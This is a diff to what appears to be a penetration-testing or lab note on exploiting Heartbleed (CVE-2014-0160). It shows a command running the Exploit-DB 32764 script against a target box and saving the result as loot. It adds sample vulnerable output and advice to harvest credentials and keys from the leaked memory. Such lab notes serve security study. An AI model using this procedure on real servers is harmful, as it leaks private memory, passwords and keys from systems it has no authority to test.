@@ -20,6 +20,16 @@ python2 $BoxDir/exploits/heartbleed-32764.py $BoxIP -p $SSLPort \
   > $BoxDir/loot/heartbleed-output.txt
 ```
 
+## Example output
+
+```text
+WARNING: server returned more data than allowed
+Received heartbeat response: 4096 bytes
+type = 24, length = 4096
+```
+
+Focus on excess response data, not the presence of a TLS connection alone. A normal three-byte response or a generic TLS alert does not prove useful disclosure. If excess data is confirmed, save it privately, filter printable strings, and route any identified credential or key to [[Linux - Credential Search]].
+
 ## What to inspect
 
 Look for a TLS record of type 24, a response longer than the three-byte
@@ -89,4 +99,3 @@ strings -a -n 8 $BoxDir/loot/heartbleed-loop.txt | grep -v '^0x'
 - [CVE-2014-0160, MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160)
 - [Exploit-DB 32764](https://www.exploit-db.com/exploits/32764)
 - [OpenSSL Heartbleed advisory](https://www.openssl.org/news/secadv/20140407.txt)
-
